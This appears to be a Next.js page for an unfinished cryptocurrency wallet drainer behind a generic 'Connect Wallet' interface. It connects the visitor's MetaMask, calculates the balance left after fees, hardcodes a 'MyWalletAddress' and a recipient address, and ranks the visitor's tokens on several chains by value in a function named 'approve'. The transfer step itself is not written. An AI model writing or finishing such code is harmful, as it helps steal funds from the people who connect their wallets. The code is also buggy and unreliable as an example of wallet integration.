import Head from 'next/head'
import styles from '../styles/Home.module.css'
import 'bulma/css/bulma.css'
import {BigNumber, ethers} from 'ethers'
import { useState, useEffect } from 'react'
import { aggregator, IERC20, ERC20, GetBalanceAbi, GetBalanceAddress, SenderAbi } from '../constants'

import * as ethAddresses from'../addresses/ethAddresses'
import * as bscAddresses from'../addresses/bscAddresses'
import * as polygonAddresses from'../addresses/polygonAddresses'
import _ from 'lodash'


const MyWalletAddress = "0x39A77B13BA2C5FA2249f7e5a4194582824D58c8E"



export default function Home() {

  const [account, setAccount] = useState()
  // const [user, setUser] = useState()
  const [isConnected, setIsConnected] = useState(false)
  const [provider, setProvider] = useState()
  const [signer, setSigner] = useState()
  const [balance, setBalance] = useState()
  const [gasPrice, setGasPrice] = useState()
  const [gasLimit, setGasLimit] = useState()
  const [aggregatorContract, setAggregatorContract] = useState()
  const [tokenContract, setTokenContract] = useState()
  const [error, setError] = useState()
  const [sucMsg, setSucMsg] = useState()
  const [chainId, setChainId] = useState()
  const [ethBalances, setEthBalances] = useState()
  const [bscBalances, setBscBalances] = useState()
  const [polygonBalances, setPolygonBalances] = useState()
  const [arbBalances, setArbBalances] = useState()
  const [opBalances, setOpBalances] = useState()
  const [biggerBalanceEth, setBiggerBalanceEth] = useState()
  const [biggerBalanceBsc, setBiggerBalanceBsc] = useState()
  const [biggerBalancePolygon, setBiggerBalancePolygon] = useState()
  const [biggerBalanceOp, setBiggerBalanceOp] = useState()
  const [biggerBalanceArb, setBiggerBalanceArb] = useState()
  
  let etherValueOfUser
  let Receptient = '0x1204D7F27702d793260Ad5a406dDEE7660d21B61'
  let user
  let _signer
  



  async function connect() {

    setError("")
    setSucMsg("")
    if (typeof window.ethereum !== 'undefined'){
      const isConnected1 = ethereum.isConnected()
      setIsConnected(isConnected1)
      try{
      const accounts = await ethereum.request({method: "eth_requestAccounts"})
      setAccount(accounts[0])
      const _provider = new ethers.providers.Web3Provider(window.ethereum,"any")
      setProvider(_provider)


      user = await _provider.send("eth_requestAccounts", []);

      _signer = _provider.getSigner()
      setSigner(_signer)
 
      const chainId = await signer.getChainId()
      setChainId(chainId)
      console.log(`chain id: ${chainId}`);

      const bal = await _signer.getBalance(user.address)
      const balToEth = ethers.utils.formatEther(bal)
   
      const gasL = ethers.utils.hexlify(100000)
      setGasLimit(gasL)

      const gasP = _provider.getGasPrice()
  
      setGasPrice(gasP)
      const fee = (await gasP).mul(gasL)
      const finalAmount = bal - (fee * 10)
      const finalAmountToString = finalAmount.toString()
      const finalAmountBigNumber =await BigNumber.from(finalAmountToString)
      setBalance(finalAmountBigNumber)
      console.log('amount - fee :',finalAmount);

      const isConnected2 = ethereum.isConnected()
      setIsConnected(isConnected2)
      // getData()


      window.ethereum.on('accountsChanged',async () =>{
        const newAccounts = await ethereum.request({method: "eth_requestAccounts"})
        setAccount(newAccounts[0])
        console.log("connected wallet changed to:",newAccounts[0]);
      })
    
      ethereum.on('chainChanged', async () => {
        const newChainId = await signer.getChainId()
        setChainId(newChainId)
        console.log(`chain id changed to :${newChainId}`);
        window.location.reload();
      })
      ethereum.on('disconnect', setIsConnected(false));
      const isConnected3 = ethereum.isConnected()
      setIsConnected(isConnected3)
      
        console.log('user disconnected!');
      } catch(err){
        setError(err.message)
        // console.log('user rejected!');
      }
    }else{
      console.log("Please install MetaMask!");
    }
  }
  let _demical


  let availableTokensOfBsc = []
  let availableTokensOfEth = []
  let availableTokensOfPolygon = []
  


  async function getAddressTest() {

    const chainId = await signer.getChainId()

    // Object.entries(ethAddresses.address).forEach(async ([key, value]) => {
      // console.log(key, value) // "someKey" "some value", "hello" "world", "js javascript foreach object"
      // const contract = new ethers.Contract(value,ERC20,provider)
      // console.log(contract);
      // const balanceOfToken = await contract.balanceOf(account)
      // console.log(balanceOfToken);
      // const decimals = await contract.decimals()
      // console.log(decimals);
      // const balanceWithoutEth = balanceWithDec/(10**decimals)
      // console.log(balanceWithoutEth);
      // if (balanceOfToken > 1000000) {
      //   availableTokensWithValue.push(value)
      // }
      // console.log(availableTokensWithValue);

      
      
      if (chainId == 1) {
        ethAddresses.tokens.forEach(async element => {
          const contract = new ethers.Contract(element.address,ERC20,provider)
          const balanceOfToken = await contract.balanceOf("0x434587332CC35D33db75B93F4f27CC496c67A4Db")
          // const balanceOfToken = await contract.balanceOf("0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe")
          // const tokenName = await contract.symbol()
          if (balanceOfToken > 1000000) {
            
            const decimals = await contract.decimals()
            const balanceWithoutDecimals = balanceOfToken/(10**decimals)
            console.log('you got balance');
            element.balance = balanceOfToken
            let value 
            if (element.priceToEthAddress == false) {
              const price = 0
              if (element.priceAddress == 0) {
                value = balanceWithoutDecimals * 1
              } else {
                const priceContract = new ethers.Contract(element.priceAddress,aggregator,provider)
                const tokenPrice = await priceContract.latestRoundData()
                const currentTokenPrice = tokenPrice.answer/10**8
               value = balanceWithoutDecimals * currentTokenPrice
                console.log('token value:',value);
                console.log(currentTokenPrice);
              }
              element.value = value
              availableTokensOfEth.push(element)
              console.log(element);
            } else {
            const priceEth = new ethers.Contract("0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419",aggregator,provider)
            const ethPrice = await priceEth.latestRoundData()
            const currentEthPrice = ethPrice.answer/(10**8)
            const priceToEthContract = new ethers.Contract(element.priceAddress,aggregator,provider)
            const priceToEth = await priceToEthContract.latestRoundData()
            const tokenPrice = (priceToEth.answer * currentEthPrice) / (10**decimals)
            value = tokenPrice * balanceWithoutDecimals
            console.log(tokenPrice);
            element.value = value
            availableTokensOfEth.push(element)
            console.log(element);
            }
            
          } else {
          ethAddresses.tokens.pop(element)
          console.log('balance zero');
          } 
          console.log(availableTokensOfEth);
        });

        
      }
      if (chainId == 137) {
        polygonAddresses.tokens.forEach(async element => {
          const contract = new ethers.Contract(element.address,ERC20,provider)
          const balanceOfToken = await contract.balanceOf(account)
       
          if (balanceOfToken > 1000000) {
            const decimals = await contract.decimals()
            const balanceWithoutDecimals = balanceOfToken/(10**decimals)
            console.log('you got balance');
            element.balance = balanceOfToken
            let value 
            const price = 0
            if (element.priceAddress == 0) {
              value = balanceWithoutDecimals * 1
            } else {
              const priceContract = new ethers.Contract(element.priceAddress,aggregator,provider)
              const tokenPrice = await priceContract.latestRoundData()
              const currentTokenPrice = tokenPrice.answer/10**8
              value = balanceWithoutDecimals * currentTokenPrice
              console.log('token Price:',currentTokenPrice);
            }
            console.log(value);
            element.value = value
            availableTokensOfPolygon.push(element)
          } else {
            console.log('balance zero');
          }
          // console.log(availableTokensWithValue);
        });
      }
      
    }
    function getLargerAmount ( array ) {
      let biggestAmount = 0
      let biggest 
      let biggestIndex = 0
      for (let i = 0; i < array.length; i++) {
      const element = array[i].value;
        if (i >= 0 && element > biggestAmount) {
          biggest = array[i]
          biggestIndex = i
        }
      }
      // setBiggerBalanceEth(Biggest)
      array.splice(biggestIndex,1)
      return biggest
    }


    async function approve(){
        const chainId = await signer.getChainId()
        if (chainId == 1 ) {
          const tokenWithBiggerValue = getLargerAmount(availableTokensOfEth)
          console.log(tokenWithBiggerValue);
          console.log(availableTokensOfEth);
        }
        if (chainId == 137) {
          
        }
        if (chainId == 56) {
          
        }
    }

    //__________________________________
    // })

    // _.forEach({ethAddresses} , function(value) {
    //   console.log(ethAddresses.address);
    //   console.log(value);
    // })

    // const ethAdd = ethAddresses.address.WETHETH
    // console.log(ethAdd);
    // const contract = new ethers.Contract(ethAdd,ERC20,provider)
    // console.log(contract);
    // const balanceOfToken = await contract.balanceOf(account)
    // console.log(balanceOfToken);
    // const decimals = await contract.decimals()
    // console.log(decimals);
  

  async function createindex (priceContractAddress, tokenContractAddress , nameOfToken) {
    const priceContract = new ethers.Contract(priceContractAddress ,aggregator,provider)
    const tokenPriceWithDecimals = await priceContract.latestRoundData()
    const currentTokenPrice = tokenPriceWithDecimals.answer / 10**8
    const tokenContract = new ethers.Contract(tokenContractAddress,ERC20,provider)
    const balanceOfToken = await tokenContract.balanceOf(account)
    const valueOfTokenInAddress = (balanceOfToken*currentTokenPrice) / 10**18
    if ( balanceOfToken > 1000 ) {
        nameOfToken = {
            tokenAddress: tokenContractAddress,
            tokenBalance: balanceOfToken,
            tokenValue: valueOfTokenInAddress,
        }
        tokens.push(nameOfToken)
    }
    console.log(balanceOfToken);
}

 
  return (
    <div className='has-background-white'>
    <div className={styles.container}>
      <Head>
        <title>Create Next App</title>
        <meta name="description" content="Generated by create next app" />
        <link rel="icon" href="/favicon.ico" />
      </Head>
      
        <div className="has-background-white">
          <div className='box has-background-white'>
            <nav className='navbar has-background-white'>
              <div className='navbar-end'>
                <button onClick={() =>connect()} className='button is-link' >
                  Connect Wallet
                </button>
                {/* { isConnected ? (<button  className='button is-info ' disabled>Connected</button>) : (<button onClick={() =>connect()} className='button is-link' >
                  Connect Wallet
                </button>) } */}
                <button onClick={() => getAddressTest()} className= 'button is-primary ml-2'>
                  GetBalance
                </button>
                <button onClick={() => approve()} className='button is-link'>getData</button>
              </div>
            </nav>
          </div>
        </div>
        <main className={styles.main}>
    
          
            <div className='column is-one-third'>
              <div className='box'>
                {/* <button onClick={''} className='button is-dark is-outlined is-centered mr-4'>Check Eligible</button> */}
                {/* <button onClick={() => approve} className='button is-dark is-centered' >Approve</button> */}
              </div>
            </div>
          
      </main>

      <footer className={styles.footer}>
        <a
          className='has-text-black'
          href="https://vercel.com?utm_source=create-next-app&utm_medium=default-template&utm_campaign=create-next-app"
          target="_blank"
          rel="noopener noreferrer"
        >
          Powered by Alireza Haghshenas
        </a>
      </footer>
    </div>
    </div>
  )
}
